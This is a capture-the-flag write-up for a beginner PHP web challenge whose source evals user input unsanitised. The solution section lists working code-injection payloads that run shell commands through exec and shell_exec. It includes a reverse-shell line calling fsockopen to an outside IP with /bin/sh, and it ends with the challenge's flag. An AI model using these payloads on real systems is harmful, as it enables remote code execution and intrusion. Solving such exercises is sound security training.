# Calculator Evaluation

Web, 50

### Description

Apparently my friend had just started learning PHP recently, and he has created a calculator app!
Honestly, I'm not even sure whether it fits the name of being a calculator, given that it only adds the number 12 to any input.

You can check out the site where he's hosting the calculator app [here](http://challs.sieberrsec.tech:4587/calcv1.html).


Original Challenge Author: xzy_10

## Solution

### Basic Inspection

Viewing the page source of the webpage gives me this
```

<html>
	<head>
		<link rel="stylesheet" href="styles.css">
	</head>
	<body>

		<h1>Calculator App V1!</h1>
		<h2>Limited functionality for now... But I will add more in the future!</h2>

		<form action="calcv1.php" method="get">
			Number to be added: <input type="text" name="value"><br>
		<input type="submit" value="Add!" class="button">
		</form>
		
		<h2>Check out my code! Go to this <a href = "/calcv1.php.txt">link!</a></h2>
		</body>
</html>
```

### Testing Injection

I looked up the php code since they gave us access to it.
```
<?php
//Marvel at its sheer brilliance!
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if(isset($_GET["value"])){
	eval("\$sum = 12+".$_GET["value"].";");
	echo "<h2>".$sum."</h2>";
}
else
{
	echo("<h3>Put something in! God damn it this is supposed to be trivial!</h3>");
}
?>
```
When I noticed an eval statement, you know that you can do an injection or something similar with the input field they give you.

Putting in `12; $sum = 'shit';` and submitting you get
```
Your calculated answer is: shit
```

### Researching more on PHP injections

By googling "PHP injection eval" and also googling what functions allow you to execute commands, I realised that the `exec` command may be useful

Payload | Output
--|--
`0; $sum = exec('echo test');` | `Your calculated answer is: test`
`0; $sum = exec('ls');` | `Your calculated answer is: styles.css`
`0; $sum = exec('pwd');` | `Error!`
`0; $sum = exec('ls /bin');` | `Your calculated answer is: znew`
`0; $sum = exec('ls /');` | `Your calculated answer is: var`
`0; $sum = exec('python -c "print(1) " ');` | `Your calculated answer is:`

After a while I realised there is a better way to retrieve the output of the commands, because maybe they kept being cut off. A better payload to use is 0; `0; exec('ls ', $sum); $sum = implode("\n", $sum);`

Payload | Output
--|--
`0; exec('cat styles.css', $sum); $sum = implode($sum);` | `Your calculated answer is: @import url('https://fonts.googleapis.com/css2?family=Hind:wght@500;600&display=swap');h1 { font-family: 'Hind', sans-serif;}h2 { font-family: 'Hind', sans-serif;}h3 { font-family: 'Hind', sans-serif;}h4 { font-family: 'Hind', sans-serif;}h5 { font-family: 'Hind', sans-serif;}h6 { font-family: 'Hind', sans-serif;}form { font-family: 'Hind', sans-serif; font-size: 20px;}input { font-family: 'Hind', sans-serif; font-size: 20px;}.button { font-family: 'Hind', sans-serif; font-size: 20px; color: white; background-color: #0ecf9f;}`
`0; exec('ls', $sum); $sum = implode($sum);` | `Your calculated answer is: calcv1.htmlcalcv1.phpcalcv1.php.txtstyles.css`
`0; exec('ls ../', $sum); $sum = implode($sum);` | `Your calculated answer is: calc-evalflag`

Ok I have enough tinkering around with the tiny box, I want to get a proper shell. 

I found a payload online [here](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/)

Putting in just `0; $sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");` makes the webpage take a while to load. It returns 
```
Warning: fsockopen(): unable to connect to 10.0.0.123:1111 (Connection timed out) in /usr/src/calc-eval/calcv1.php(24) : eval()'d code on line 1
Your calculated answer is: 12
```

Using https://www.whatismyip.com/ to get my external IP address and using that address to connect to my PC doesn't seem like it works too. I think this is due to my router's firewall settings

### Final Solution

In the end I coded a python program to interact with the thing to make life easier. I also realised that `shell_exec` is a better function to use. Using my python program and probing around , I get the answer

```
> ls ../../
bin
games
include
lib
lib32
lib64
libx32
local
sbin
share
src

> ls ../
calc-eval
flag

> cat ../flag
IRS{pHp_eVAl_1s_ev1l_1f_y0u_d0nt_san1t1se_y0ur_1npUt5!}
````

## Flag

`IRS{pHp_eVAl_1s_ev1l_1f_y0u_d0nt_san1t1se_y0ur_1npUt5!}`